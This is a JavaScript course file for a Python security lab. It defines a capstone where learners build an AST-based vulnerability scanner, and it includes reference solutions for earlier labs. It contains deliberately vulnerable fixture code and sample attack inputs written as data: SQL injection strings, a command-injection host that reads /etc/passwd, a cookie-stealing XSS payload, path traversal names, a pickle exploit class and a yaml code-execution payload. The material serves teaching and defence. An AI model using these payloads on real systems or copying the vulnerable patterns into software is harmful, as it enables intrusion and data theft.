        why: "Sources to sinks: that's also how scanners like CodeQL model it." },
      { q: "Which bug can't be found by looking for dangerous function calls?", options: ["SQL injection", "XSS", "Missing access control", "Pickle deserialization"], answer: 2,
        why: "A missing check has no call to search for. You find it by asking who should be allowed to do this." },
      { q: "What makes a finding useful to the developer?", options: ["Just the line number", "Location, bug class, example exploit, impact and fix", "The CVSS score only", "A link to OWASP"], answer: 1,
        why: "An example exploit and impact explain why it matters; the fix makes it actionable." }
    ]
  });

  /* ================================================================== PY-136 capstone */
  var SAST_FILES = {
    "src/app.py": lines(
      "import hashlib", "import os", "import pickle", "import subprocess", "", "import requests", "import yaml", "", "",
      "def find_user(db, name):",
      "    return db.execute(f\"SELECT * FROM users WHERE name = '{name}'\").fetchall()", "", "",
      "def find_orders(db, customer):",
      "    return db.execute(\"SELECT * FROM orders WHERE customer = '\" + customer + \"'\").fetchall()", "", "",
      "def count_orders(db):",
      "    return db.execute(\"SELECT COUNT(*) FROM orders\").fetchone()[0]", "", "",
      "def backup(table):",
      "    os.system(\"tar czf /backups/\" + table + \".tgz /data/\" + table)", "", "",
      "def convert(path):",
      "    subprocess.run(f\"convert {path} out.png\", shell=True)", "", "",
      "def calc(expr):",
      "    return eval(expr)", "", "",
      "def load_session(cookie):",
      "    return pickle.loads(cookie)", "", "",
      "def load_config(text):",
      "    return yaml.load(text, Loader=yaml.Loader)", "", "",
      "def fingerprint(password):",
      "    return hashlib.md5(password.encode()).hexdigest()", "", "",
      "def fetch_status(url):",
      "    return requests.get(url, verify=False, timeout=5).status_code"),
    "src/report.py": lines(
      "import hashlib", "", "",
      "def build_title(table, day):",
      "    return \"Report for %s on %s\" % (table, day)", "", "",
      "def run_report(db, day):",
      "    return db.execute(\"SELECT * FROM events WHERE day = '%s'\" % day).fetchall()", "", "",
      "def checksum(data):",
      "    return hashlib.sha1(data).hexdigest()", "", "",
      "def render(template, **values):",
      "    return template.format(**values)"),
    "fixed/app.py": lines(
      "import ast", "import hashlib", "import json", "import subprocess", "", "import requests", "import yaml", "", "",
      "def find_user(db, name):",
      "    return db.execute(\"SELECT * FROM users WHERE name = ?\", (name,)).fetchall()", "", "",
      "def count_users(db):",
      "    return db.execute(\"SELECT COUNT(*) FROM users\").fetchone()[0]", "", "",
      "def backup(table):",
      "    subprocess.run([\"tar\", \"czf\", f\"/backups/{table}.tgz\", f\"/data/{table}\"], timeout=60)", "", "",
      "def calc(expr):",
      "    return ast.literal_eval(expr)", "", "",
      "def load_session(cookie):",
      "    return json.loads(cookie)", "", "",
      "def load_config(text):",
      "    return yaml.safe_load(text)", "", "",
      "def fingerprint(data):",
      "    return hashlib.sha256(data).hexdigest()", "", "",
      "def fetch_status(url):",
      "    return requests.get(url, timeout=5).status_code", "", "",
      "def describe(item):",
      "    return f\"{item['name']} costs {item['price']}\"")
  };

  var SAST_WANT = py`
    WANT = ["src/app.py:11 [HIGH] K101 SQL query built from a string",
            "src/app.py:15 [HIGH] K101 SQL query built from a string",
            "src/app.py:23 [HIGH] K102 os.system runs a shell command",
            "src/app.py:27 [HIGH] K103 subprocess call with shell=True",
            "src/app.py:31 [HIGH] K104 eval/exec runs dynamic code",
            "src/app.py:35 [HIGH] K105 pickle can run code while loading",
            "src/app.py:39 [MEDIUM] K106 yaml.load can run code (use yaml.safe_load)",
            "src/app.py:43 [MEDIUM] K107 MD5/SHA-1 is a weak hash",
            "src/app.py:47 [MEDIUM] K108 TLS certificate verification disabled",
            "src/report.py:9 [HIGH] K101 SQL query built from a string",
            "src/report.py:13 [MEDIUM] K107 MD5/SHA-1 is a weak hash"]

    PROBE = '''import os, pickle, subprocess, yaml, hashlib, requests
    db.execute(f"SELECT {x}")
    db.executemany("INSERT INTO t VALUES ('%s')" % v, rows)
    cur.execute("SELECT * FROM t WHERE a = '{}'".format(a))
    os.popen("ls " + d)
    subprocess.check_output(cmd, shell=True)
    exec(code)
    pickle.load(fh)
    yaml.load(s)
    hashlib.sha1(b)
    requests.post(u, data=d, verify=False)
    '''
    PROBE_WANT = [(2, "K101"), (3, "K101"), (4, "K101"), (5, "K102"), (6, "K103"), (7, "K104"), (8, "K105"), (9, "K106"), (10, "K107"), (11, "K108")]

    SAFE = '''import ast, json, subprocess, yaml, hashlib, requests
    db.execute("SELECT * FROM t WHERE a = ?", (a,))
    db.execute("SELECT 1")
    db.execute(QUERIES["count"])
    db.execute(build_query(table), params)
    title = f"Report for {day}"
    msg = "Hello %s" % name
    subprocess.run(["ls", "-l"], shell=False)
    ast.literal_eval(text)
    json.loads(text)
    yaml.safe_load(text)
    hashlib.sha256(b)
    requests.get(u, verify=True, timeout=5)
    evaluate(x)
    '''

    def rules_of(findings):
        return [(f.line, f.rule) for f in findings]
  ` + NL;

  LABS.push({
    id: "py-136", n: 36, module: 4, ticket: "PY-136", xp: 200, capstone: true,
    title: "Build a security scanner",
    topic: "Module 4 capstone project",
    from: "Dev Patel & Maya Chen",
    story: "<p>You found six bugs by reading in PY-135. But Kestrel has hundreds of repositories, and reviewers get tired. Every bug class you exploited this module has a recognisable <b>shape</b> in the code, and shapes can be detected automatically.</p>" +
      "<p>Build <code>kscan</code>: a static analysis (SAST) tool that parses Python files, flags the dangerous patterns, and fails the build like your Module 3 gate. It's the whole Python track in one program.</p>",
    learn:
      '<div class="callout warn"><b>Capstone rules.</b> There are no hints. The Python <code>ast</code> module is new, so this brief includes a short primer with examples you can run. Build one piece at a time and test it in the console. ' +
      "If you get completely stuck, the Tasks tab has a button to reveal the full solution. The capstone then earns half XP.</div>" +
      "<h3>Primer: reading code as a tree</h3><p>Searching code with regexes is fragile: comments, strings and line breaks fool it. <code>ast.parse</code> turns source code into the same <b>syntax tree</b> Python itself uses, so you can ask precise questions like \"is this a call to <code>os.system</code>?\".</p>" +
      ex('import ast\n\ntree = ast.parse(\'os.system("ls " + d)\')\nprint(ast.dump(tree.body[0].value, indent=2))') +
      "<p><code>ast.walk(tree)</code> visits every node. Calls are <code>ast.Call</code>: <code>.func</code> is what's called, <code>.args</code> the positional arguments, <code>.keywords</code> the <code>name=value</code> ones, and every node has a <code>.lineno</code>.</p>" +
      ex('import ast\n\nsrc = \'\'\'import os\nos.system("ls")\nprint("hi", end="")\nrequests.get(u, verify=False)\n\'\'\'\nfor node in ast.walk(ast.parse(src)):\n    if isinstance(node, ast.Call):\n        print(node.lineno, ast.unparse(node.func), [ast.unparse(a) for a in node.args], [(k.arg, ast.unparse(k.value)) for k in node.keywords])') +
      "<p>The starter gives you <code>call_name(node)</code>, which turns a call's <code>.func</code> into a dotted name like <code>\"os.system\"</code>, <code>\"db.execute\"</code> or <code>\"eval\"</code>. A keyword's value is an <code>ast.Constant</code> when it's a literal like <code>True</code>: check <code>isinstance(k.value, ast.Constant) and k.value.value is True</code>.</p>" +
      "<p>For SQL, look at the <b>first argument</b> of <code>.execute</code>/<code>.executemany</code>: an f-string is an <code>ast.JoinedStr</code>, <code>\"...\" + x</code> and <code>\"...\" % x</code> are an <code>ast.BinOp</code> with <code>op</code> <code>ast.Add</code> / <code>ast.Mod</code>, and <code>\"...\".format(x)</code> is a Call whose func is an <code>ast.Attribute</code> with <code>attr == \"format\"</code>.</p>" +
      "<h3>The rules</h3>" +
      '<table class="t"><tr><th>Rule</th><th>Severity</th><th>Flags</th><th>Message</th></tr>' +
      "<tr><td>K101</td><td>high</td><td><code>*.execute</code>/<code>*.executemany</code> whose first argument is an f-string, <code>+</code>, <code>%</code> or <code>.format()</code></td><td>SQL query built from a string</td></tr>" +
      "<tr><td>K102</td><td>high</td><td><code>os.system</code>, <code>os.popen</code></td><td>os.system runs a shell command</td></tr>" +
      "<tr><td>K103</td><td>high</td><td>any call with <code>shell=True</code></td><td>subprocess call with shell=True</td></tr>" +
      "<tr><td>K104</td><td>high</td><td><code>eval</code>, <code>exec</code></td><td>eval/exec runs dynamic code</td></tr>" +
      "<tr><td>K105</td><td>high</td><td><code>pickle.loads</code>, <code>pickle.load</code></td><td>pickle can run code while loading</td></tr>" +
      "<tr><td>K106</td><td>medium</td><td><code>yaml.load</code></td><td>yaml.load can run code (use yaml.safe_load)</td></tr>" +
      "<tr><td>K107</td><td>medium</td><td><code>hashlib.md5</code>, <code>hashlib.sha1</code></td><td>MD5/SHA-1 is a weak hash</td></tr>" +
      "<tr><td>K108</td><td>medium</td><td>any call with <code>verify=False</code></td><td>TLS certificate verification disabled</td></tr></table>" +
      "<h3>What to build</h3>" +
      '<table class="t"><tr><th>Piece</th><th>Spec</th></tr>' +
      "<tr><td><code>Finding(rule, severity, path, line, message)</code></td><td>severity lowercased; <code>LEVELS</code>, <code>rank()</code>, <code>is_blocking(threshold=\"high\")</code> as in PY-125; <code>__str__</code> → <code>src/app.py:11 [HIGH] K101 SQL query built from a string</code>; <code>to_dict()</code> with the five fields</td></tr>" +
      "<tr><td><code>scan_source(source, path)</code></td><td>a Finding for every rule match in the source, sorted by line then rule</td></tr>" +
      "<tr><td><code>scan_tree(root)</code></td><td>scans every <code>.py</code> file under <code>root</code> (sorted), paths with forward slashes</td></tr>" +
      "<tr><td><code>main(argv=None)</code></td><td>arguments: <code>path</code>, <code>--fail-on</code> (a level, default <code>high</code>), <code>--json</code>. Prints each finding then <code>11 findings, 7 at or above high</code>; with <code>--json</code> prints only a JSON list of <code>to_dict()</code>s. Returns 1 if any finding is at or above the threshold, else 0.</td></tr></table>" +
      "<p>Test files: <code>src/</code> (vulnerable) and <code>fixed/</code> (the same app done safely, which must produce <b>no</b> findings: false alarms make people ignore a scanner).</p>" +
      "<h3>Expected output</h3>" +
      '<pre class="code">src/app.py:11 [HIGH] K101 SQL query built from a string\nsrc/app.py:15 [HIGH] K101 SQL query built from a string\nsrc/app.py:23 [HIGH] K102 os.system runs a shell command\nsrc/app.py:27 [HIGH] K103 subprocess call with shell=True\nsrc/app.py:31 [HIGH] K104 eval/exec runs dynamic code\nsrc/app.py:35 [HIGH] K105 pickle can run code while loading\nsrc/app.py:39 [MEDIUM] K106 yaml.load can run code (use yaml.safe_load)\nsrc/app.py:43 [MEDIUM] K107 MD5/SHA-1 is a weak hash\nsrc/app.py:47 [MEDIUM] K108 TLS certificate verification disabled\nsrc/report.py:9 [HIGH] K101 SQL query built from a string\nsrc/report.py:13 [MEDIUM] K107 MD5/SHA-1 is a weak hash\n11 findings, 7 at or above high\n↳ exit code 1</pre>',
    starter: py`
      # PY-136 · Build a security scanner (Module 4 capstone)
      import argparse
      import ast
      import json
      import sys
      from pathlib import Path

      RULES = {
          "K101": ("high", "SQL query built from a string"),
          "K102": ("high", "os.system runs a shell command"),
          "K103": ("high", "subprocess call with shell=True"),
          "K104": ("high", "eval/exec runs dynamic code"),
          "K105": ("high", "pickle can run code while loading"),
          "K106": ("medium", "yaml.load can run code (use yaml.safe_load)"),
          "K107": ("medium", "MD5/SHA-1 is a weak hash"),
          "K108": ("medium", "TLS certificate verification disabled"),
      }


      def call_name(node):
          """The dotted name of what an ast.Call calls: "os.system", "db.execute", "eval"."""
          func = node.func
          if isinstance(func, ast.Name):
              return func.id
          if isinstance(func, ast.Attribute):
              base = func.value
              prefix = base.id if isinstance(base, ast.Name) else "?"
              return prefix + "." + func.attr
          return "?"


      class Finding:
          pass


      def scan_source(source, path):
          pass


      def scan_tree(root):
          pass


      def main(argv=None):
          pass


      if __name__ == "__main__":
          sys.exit(main())
    `,
    argv: "src",
    files: SAST_FILES,
    solution: py`
      import argparse
      import ast
      import json
      import sys
      from pathlib import Path

      RULES = {
          "K101": ("high", "SQL query built from a string"),
          "K102": ("high", "os.system runs a shell command"),
          "K103": ("high", "subprocess call with shell=True"),
          "K104": ("high", "eval/exec runs dynamic code"),
          "K105": ("high", "pickle can run code while loading"),
          "K106": ("medium", "yaml.load can run code (use yaml.safe_load)"),
          "K107": ("medium", "MD5/SHA-1 is a weak hash"),
          "K108": ("medium", "TLS certificate verification disabled"),
      }


      def call_name(node):
          func = node.func
          if isinstance(func, ast.Name):
              return func.id
          if isinstance(func, ast.Attribute):
              base = func.value
              prefix = base.id if isinstance(base, ast.Name) else "?"
              return prefix + "." + func.attr
          return "?"


      class Finding:
          LEVELS = ["low", "medium", "high", "critical"]

          def __init__(self, rule, severity, path, line, message):
              self.rule = rule
              self.severity = severity.lower()
              self.path = path
              self.line = line
              self.message = message

          def rank(self):
              return self.LEVELS.index(self.severity)

          def is_blocking(self, threshold="high"):
              return self.rank() >= self.LEVELS.index(threshold)

          def to_dict(self):
              return {"rule": self.rule, "severity": self.severity, "path": self.path, "line": self.line, "message": self.message}

          def __str__(self):
              return f"{self.path}:{self.line} [{self.severity.upper()}] {self.rule} {self.message}"


      def is_built_string(node):
          if isinstance(node, ast.JoinedStr):
              return True
          if isinstance(node, ast.BinOp) and isinstance(node.op, (ast.Add, ast.Mod)):
              return True
          return isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute) and node.func.attr == "format"


      def keyword_is(node, name, value):
          return any(k.arg == name and isinstance(k.value, ast.Constant) and k.value.value is value for k in node.keywords)


      def rules_for(node):
          name = call_name(node)
          found = []
          if name.endswith((".execute", ".executemany")) and node.args and is_built_string(node.args[0]):
              found.append("K101")
          if name in ("os.system", "os.popen"):
              found.append("K102")
          if keyword_is(node, "shell", True):
              found.append("K103")
          if name in ("eval", "exec"):
              found.append("K104")
          if name in ("pickle.loads", "pickle.load"):
              found.append("K105")
          if name == "yaml.load":
              found.append("K106")
          if name in ("hashlib.md5", "hashlib.sha1"):
              found.append("K107")
          if keyword_is(node, "verify", False):
              found.append("K108")
          return found


      def scan_source(source, path):
          findings = []
          for node in ast.walk(ast.parse(source)):
              if isinstance(node, ast.Call):
                  for rule in rules_for(node):
                      severity, message = RULES[rule]
                      findings.append(Finding(rule, severity, path, node.lineno, message))
          findings.sort(key=lambda f: (f.line, f.rule))
          return findings


      def scan_tree(root):
          findings = []
          for path in sorted(Path(root).rglob("*.py")):
              findings += scan_source(path.read_text(), path.as_posix())
          return findings


      def main(argv=None):
          parser = argparse.ArgumentParser(prog="kscan", description="A tiny security scanner for Python code.")
          parser.add_argument("path", help="folder to scan")
          parser.add_argument("--fail-on", choices=Finding.LEVELS, default="high")
          parser.add_argument("--json", action="store_true", help="print findings as JSON")
          args = parser.parse_args(argv)

          findings = scan_tree(args.path)
          blocking = [f for f in findings if f.is_blocking(args.fail_on)]
          if args.json:
              print(json.dumps([f.to_dict() for f in findings], indent=2))
          else:
              for f in findings:
                  print(f)
              print(f"{len(findings)} findings, {len(blocking)} at or above {args.fail_on}")
          return 1 if blocking else 0


      if __name__ == "__main__":
          sys.exit(main())
    `,
    objectives: [
      {
        id: "finding", hints: [],
        text: "<code>Finding</code> works as specified: lowercased severity, <code>LEVELS</code>, <code>rank()</code>, <code>is_blocking()</code>, <code>__str__</code> and <code>to_dict()</code>.",
        check: py`
          def check(ns, out, run, src):
              C = ns.get("Finding")
              if not isinstance(C, type):
                  return "I can't find a class called Finding."
              try:
                  f = C("K101", "HIGH", "src/app.py", 11, "SQL query built from a string")
                  m = C("K107", "Medium", "src/x.py", 3, "MD5/SHA-1 is a weak hash")
                  checks = [(f.severity, "high", "severity"), (getattr(C, "LEVELS", None), ["low", "medium", "high", "critical"], "Finding.LEVELS"),
                            (f.rank(), 2, "rank() of a high finding"), (m.is_blocking(), False, "is_blocking() of a medium finding"),
                            (m.is_blocking("medium"), True, "is_blocking(\"medium\") of a medium finding"),
                            (str(f), "src/app.py:11 [HIGH] K101 SQL query built from a string", "str(finding)"),
                            (f.to_dict(), {"rule": "K101", "severity": "high", "path": "src/app.py", "line": 11, "message": "SQL query built from a string"}, "to_dict()")]
              except Exception as e:
                  return "Using Finding crashed: " + type(e).__name__ + ": " + str(e)
              for got, want, label in checks:
                  if got != want or type(got) is not type(want):
                      return label + " should be " + H.short(want, 120) + ", got " + H.short(got, 120) + "."
              return True
        `
      },
      {
        id: "rules", hints: [],
        text: "<code>scan_source</code> detects every rule, with the right line numbers, including variants like <code>.executemany</code>, <code>%</code>, <code>.format()</code>, <code>os.popen</code> and <code>exec</code>.",
        check: SAST_WANT + py`
          def check(ns, out, run, src):
              f = H.fn(ns, "scan_source")
              if not f:
                  return "I can't find scan_source."
              ok, got = H.call(f, PROBE, "probe.py")
              if not ok:
                  return "scan_source(probe) crashed: " + type(got).__name__ + ": " + str(got)
              try:
                  pairs = rules_of(got)
              except Exception:
                  return "scan_source should return a list of Findings, got " + H.short(got) + "."
              missing = [p for p in PROBE_WANT if p not in pairs]
              extra = [p for p in pairs if p not in PROBE_WANT]
              if missing or extra:
                  lines = PROBE.splitlines()
                  msg = "On this test code:\n  " + "\n  ".join(str(i + 1) + "  " + l for i, l in enumerate(lines))
                  if missing:
                      msg += "\nmissed: " + ", ".join(r + " on line " + str(n) for n, r in missing)
                  if extra:
                      msg += "\nunexpected: " + ", ".join(r + " on line " + str(n) for n, r in extra)
                  return msg
              if pairs != sorted(pairs):
                  return "Sort the findings by line, then rule."
              if any(x.path != "probe.py" or x.severity != {"K106": "medium", "K107": "medium", "K108": "medium"}.get(x.rule, "high") for x in got):
                  return "Each Finding needs the path you were given and the rule's severity from RULES."
              return True
        `
      },
      {
        id: "precise", hints: [],
        text: "No false alarms: safe code (parameters, constant SQL, f-strings that aren't SQL, <code>shell=False</code>, <code>literal_eval</code>, <code>safe_load</code>, <code>sha256</code>, <code>verify=True</code>) gives no findings, and neither does <code>fixed/app.py</code>.",
        check: SAST_WANT + py`
          def check(ns, out, run, src):
              f = H.fn(ns, "scan_source")
              if not f:
                  return "I can't find scan_source."
              for code, label in [(SAFE, "this safe code"), (open("fixed/app.py").read(), "fixed/app.py")]:
                  ok, got = H.call(f, code, "x.py")
                  if not ok:
                      return "scan_source crashed on " + label + ": " + type(got).__name__ + ": " + str(got)
                  if not isinstance(got, list):
                      return "scan_source should return a list of Findings (an empty list when nothing is found), got " + H.short(got) + "."
                  if got:
                      lines = code.splitlines()
                      return "False alarms on " + label + ":\n  " + "\n  ".join(x.rule + " on line " + str(x.line) + ": " + lines[x.line - 1].strip() for x in got)
              return True
        `
      },
      {
        id: "tree", hints: [],
        text: "<code>scan_tree(\"src\")</code> returns the 11 findings in both files, sorted by path then line.",
        check: SAST_WANT + py`
          def check(ns, out, run, src):
              import os
              f = H.fn(ns, "scan_tree")
              if not f:
                  return "I can't find scan_tree."
              ok, got = H.call(f, "src")
              if not ok:
                  return "scan_tree(\"src\") crashed: " + type(got).__name__ + ": " + str(got)
              strs = [str(x) for x in got] if isinstance(got, list) else []
              if strs != WANT:
                  return "scan_tree(\"src\") should give:\n  " + "\n  ".join(WANT) + "\nYours:\n  " + ("\n  ".join(strs[:14]) or "(nothing)")
              os.makedirs("src/jobs", exist_ok=True)
              with open("src/jobs/nightly.py", "w") as fh:
                  fh.write("import os\n\nos.system(cmd)\n")
              with open("src/notes.txt", "w") as fh:
                  fh.write("eval(x)\n")
              ok, got = H.call(f, "src")
              os.remove("src/jobs/nightly.py")
              os.remove("src/notes.txt")
              strs = [str(x) for x in got] if ok else []
              if "src/jobs/nightly.py:3 [HIGH] K102 os.system runs a shell command" not in strs:
                  return "When I added src/jobs/nightly.py (os.system on line 3), scan_tree didn't report it. Scan every .py file in sub-folders too."
              if any("notes.txt" in s for s in strs):
                  return "Only scan .py files: scan_tree reported src/notes.txt."
              return True
        `
      },
      {
        id: "cli", hints: [],
        text: "Run as a tool, it prints the findings and the summary line, and exits with 1 when anything is at or above <code>--fail-on</code>, otherwise 0.",
        check: SAST_WANT + py`
          def check(ns, out, run, src):
              n, o, e = run(argv="src")
              if e:
                  return "Running with arguments \"src\" crashed:\n" + e[0][-400:]
              want = WANT + ["11 findings, 7 at or above high"]
              if H.lines(o) != want:
                  return "With arguments \"src\", expected:\n  " + "\n  ".join(want) + "\nYou printed:\n  " + ("\n  ".join(H.lines(o)[:14]) or "(nothing)")
              if n.get("__exit_code__") != 1:
                  return "With high findings the exit code should be 1, but it was " + str(n.get("__exit_code__")) + ". Return 1 from main() and use sys.exit(main())."
              for argv, line, code in [("src --fail-on critical", "11 findings, 0 at or above critical", 0), ("src --fail-on medium", "11 findings, 11 at or above medium", 1), ("fixed", "0 findings, 0 at or above high", 0)]:
                  n, o, e = run(argv=argv)
                  lines = H.lines(o)
                  if not lines or lines[-1] != line or n.get("__exit_code__") != code:
                      return "With arguments \"" + argv + "\" expected the last line " + line + " and exit code " + str(code) + "; got " + H.short(lines[-1:] or "nothing") + " and exit code " + str(n.get("__exit_code__")) + "."
              n, o, e = run(argv="src --fail-on urgent")
              if n.get("__exit_code__") != 2:
                  return "--fail-on urgent should be rejected by argparse (exit code 2). Use choices."
              return True
        `
      },
      {
        id: "json", hints: [],
        text: "With <code>--json</code>, the tool prints only a JSON list of the findings' <code>to_dict()</code>s.",
        check: SAST_WANT + py`
          def check(ns, out, run, src):
              import json
              n, o, e = run(argv="src --json")
              try:
                  data = json.loads(o)
              except ValueError:
                  return "With --json the output should be only JSON. It was:\n  " + o.strip()[:300]
              if not isinstance(data, list) or len(data) != 11:
                  return "The JSON should be a list of the 11 findings, got " + H.short(data, 120) + "."
              if data[0] != {"rule": "K101", "severity": "high", "path": "src/app.py", "line": 11, "message": "SQL query built from a string"}:
                  return "The first JSON finding should be " + json.dumps({"rule": "K101", "severity": "high", "path": "src/app.py", "line": 11, "message": "SQL query built from a string"}) + ", got " + json.dumps(data[0])
              if n.get("__exit_code__") != 1:
                  return "--json changes the output format, not the gate: the exit code should still be 1."
              return True
        `
      }
    ],
    debrief: "<p><b>The Python track is complete.</b> You started with <code>print()</code> and finished by writing a static-analysis tool: parsing code into a tree, matching vulnerability patterns with no false alarms on safe code, reporting as text or JSON, and gating a pipeline with an exit code.</p>" +
      "<p>That's exactly what bandit and semgrep do, and now you know how they work inside, where they're blind (the access-control bug from PY-135 has no pattern to match), and why both tools <em>and</em> human review matter. Next stop on the roadmap: PowerShell.</p>",
    realworld: "bandit is built just like this: an ast walk with one plugin per rule (B602 subprocess shell=True, B301 pickle, B506 yaml.load, B324 weak hashes, B501 verify=False). semgrep and CodeQL go further with data-flow tracking: they only flag execute() when user input can actually reach it. Run bandit -r src -f json on a real project and compare its findings with kscan's.",
    quiz: []
  });

  /* ------------------------------------------------------------------ Reference solutions */
  var SOLUTIONS = {
    "py-128": py`
      import hashlib

      db = make_db()


      def login(username, password):
          h = hashlib.sha256(password.encode()).hexdigest()
          row = db.execute(
              "SELECT role FROM users WHERE username = ? AND password_hash = ?", (username, h)
          ).fetchone()
          return row[0] if row else None


      def search_orders(customer):
          return db.execute("SELECT id, item FROM orders WHERE customer = ?", (customer,)).fetchall()


      print(login("maya", "correct horse"))
      print(search_orders("ana"))

      evil_username = "admin' --"
      evil_customer = "' UNION SELECT username, password_hash FROM users --"
    `,
    "py-129": py`
      import ast
      import ipaddress
      import os
      import re
      import subprocess

      HOSTNAME = re.compile(r"[A-Za-z0-9]([A-Za-z0-9.-]*[A-Za-z0-9])?")


      def valid_host(host):
          try:
              ipaddress.ip_address(host)
              return True
          except ValueError:
              return bool(HOSTNAME.fullmatch(host))


      def ping(host):
          if not valid_host(host):
              raise ValueError(f"not a valid host: {host!r}")
          result = subprocess.run(["ping", "-c", "1", host], capture_output=True, text=True, timeout=10)
          return result.returncode


      def parse_settings(text):
          return ast.literal_eval(text)


      ping("8.8.8.8")

      evil_host = "8.8.8.8; cat /etc/passwd"
      evil_settings = '__import__("os").system("whoami")'
    `,
    "py-130": py`
      import html
      from urllib.parse import urlparse


      def comment_html(author, text):
          return f'<div class="comment"><b>{html.escape(author)}</b><p>{html.escape(text)}</p></div>'


      def profile_link(name, website):
          if urlparse(website.strip()).scheme.lower() not in ("http", "https"):
              website = "#"
          return f'<a href="{html.escape(website)}">{html.escape(name)}</a>'


      browser(comment_html("ana", "Great release notes!"))
      browser(profile_link("ana", "https://kestrel.io/u/ana"))

      evil_comment = "<img src=x onerror=alert(document.cookie)>"
      evil_website = "javascript:alert(document.cookie)"
    `,
    "py-131": py`
      from pathlib import Path

      BASE = Path("public")


      def safe_path(name):
          base = BASE.resolve()
          path = (base / name).resolve()
          if not path.is_relative_to(base):
              raise PermissionError(f"{name!r} is outside the public folder")
          return path


      def download(name):
          return safe_path(name).read_text()


      def upload(name, text):
          path = safe_path(name)
          path.parent.mkdir(parents=True, exist_ok=True)
          path.write_text(text)


      def download_v2(name):
          path = (BASE / name).resolve()
          if not str(path).startswith(str(BASE.resolve())):
              raise PermissionError(name)
          return path.read_text()


      print(download("handbook.txt"))

      evil_name = "../config/db.env"
      evil_name2 = "../public-old/notes.txt"
    `
,
    "py-132": IDOR_DATA + NL + py`
      def old_get_invoice(user, invoice_id):
          return INVOICES[invoice_id]


      leaked = []
      for n in range(1000, 1011):
          invoice_id = f"INV-{n}"
          try:
              inv = old_get_invoice("ben", invoice_id)
          except KeyError:
              continue
          if inv["owner"] != "ben":
              leaked.append(invoice_id)


      def can(user, action, invoice):
          role = USERS.get(user)
          if role is None:
              return False
          staff = role in ("support", "admin")
          if action == "read":
              return invoice["owner"] == user or staff
          if action == "refund":
              return staff and invoice["status"] == "paid"
          return False


      def get_invoice(user, invoice_id):
          invoice = INVOICES.get(invoice_id)
          if invoice is None or not can(user, "read", invoice):
              raise PermissionError("invoice not found")
          return invoice


      def refund(user, invoice_id):
          invoice = INVOICES.get(invoice_id)
          if invoice is None or not can(user, "refund", invoice):
              raise PermissionError("not allowed")
          invoice["status"] = "refunded"
          return invoice
    `,
    "py-133": py`
      import base64
      import hashlib
      import hmac
      import json
      import os
      import pickle

      import yaml

      SECRET_KEY = b"kestrel-lab-signing-key"


      def sign(payload):
          return hmac.new(SECRET_KEY, payload.encode(), hashlib.sha256).hexdigest()


      def save_session(session):
          payload = base64.urlsafe_b64encode(json.dumps(session).encode()).decode()
          return payload + "." + sign(payload)


      def load_session(cookie):
          if "." not in cookie:
              raise ValueError("malformed cookie")
          payload, sig = cookie.rsplit(".", 1)
          if not hmac.compare_digest(sig, sign(payload)):
              raise ValueError("bad signature")
          return json.loads(base64.urlsafe_b64decode(payload))


      def load_config(text):
          return yaml.safe_load(text)


      cookie = save_session({"user": "ana", "role": "customer"})
      print(cookie)
      print(load_session(cookie))


      class Exploit:
          def __reduce__(self):
              return (os.system, ("whoami",))


      evil_cookie = base64.b64encode(pickle.dumps(Exploit())).decode()
      evil_yaml = '!!python/object/apply:os.system ["whoami"]'
    `,
    "py-134": py`
      import hashlib
      import hmac
      import json
      import os
      import random
      import secrets
      from datetime import datetime, timezone

      with open("leaked.json") as f:
          leaked = json.load(f)

      lookup = {}
      with open("wordlist.txt") as f:
          for line in f:
              word = line.strip()
              lookup[hashlib.sha256(word.encode()).hexdigest()] = word
      cracked = {user: lookup[h] for user, h in leaked.items() if h in lookup}


      def hash_password(password):
          salt = os.urandom(16)
          digest = hashlib.scrypt(password.encode(), salt=salt, n=2**14, r=8, p=1, dklen=64)
          return "scrypt$" + salt.hex() + "$" + digest.hex()


      def verify_password(password, stored):
          scheme, salt_hex, hash_hex = stored.split("$")
          digest = hashlib.scrypt(password.encode(), salt=bytes.fromhex(salt_hex), n=2**14, r=8, p=1, dklen=64)
          return hmac.compare_digest(digest.hex(), hash_hex)


      def old_reset_token(issued_at):
          random.seed(issued_at)
          return "".join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(20))


      ana_token_hash = "05816733db01f50dce8729767c5e62f45005cbf9b48303c66d598165ff078c52"
      predicted = None
      start = int(datetime(2026, 11, 10, 9, 10, tzinfo=timezone.utc).timestamp())
      for t in range(start, start + 601):
          token = old_reset_token(t)
          if hashlib.sha256(token.encode()).hexdigest() == ana_token_hash:
              predicted = token
              break


      def make_reset_token():
          return secrets.token_urlsafe(32)
    `,
    "py-135": py`
      import base64
      import html
      import json
      import os
      import pickle
      import subprocess
      from pathlib import Path

      db = make_db()
      REPORTS = Path("reports")
      ROLES = {"ana": "customer", "maya": "support", "root": "admin"}
      TABLES = {"users", "orders"}


      def find_user(name):
          return db.execute("SELECT username, role FROM users WHERE username = ?", (name,)).fetchall()


      def backup(table):
          if table not in TABLES:
              raise ValueError(f"unknown table: {table!r}")
          return subprocess.run(["tar", "czf", f"/backups/{table}.tgz", f"/data/{table}"], timeout=60).returncode


      def greeting(name):
          return f"<h1>Welcome back, {html.escape(name)}!</h1>"


      def report(name):
          base = REPORTS.resolve()
          path = (base / name).resolve()
          if not path.is_relative_to(base):
              raise PermissionError(name)
          return path.read_text()


      def delete_user(actor, username):
          if ROLES.get(actor) != "admin":
              raise PermissionError(f"{actor} may not delete users")
          db.execute("DELETE FROM users WHERE username = ?", (username,))
          return f"{username} deleted by {actor}"


      def load_prefs(cookie):
          return json.loads(base64.b64decode(cookie))


      review = {
          "find_user": "sql injection",
          "backup": "command injection",
          "greeting": "xss",
          "report": "path traversal",
          "delete_user": "access control",
          "load_prefs": "insecure deserialization",
      }
    `
  };

  /* ------------------------------------------------------------------ Register */
  LABS.forEach(function (l) {
    if (!l.solution && SOLUTIONS[l.id]) l.solution = SOLUTIONS[l.id];
    l.drills = [];
    T.LABS.push(l);
  });
  T.UPCOMING = T.UPCOMING.filter(function (row) { return row.module !== 4; });
  T.M4 = { FAKE_SHELL: FAKE_SHELL, FAKE_BROWSER: FAKE_BROWSER, MAKE_DB: MAKE_DB };
})();
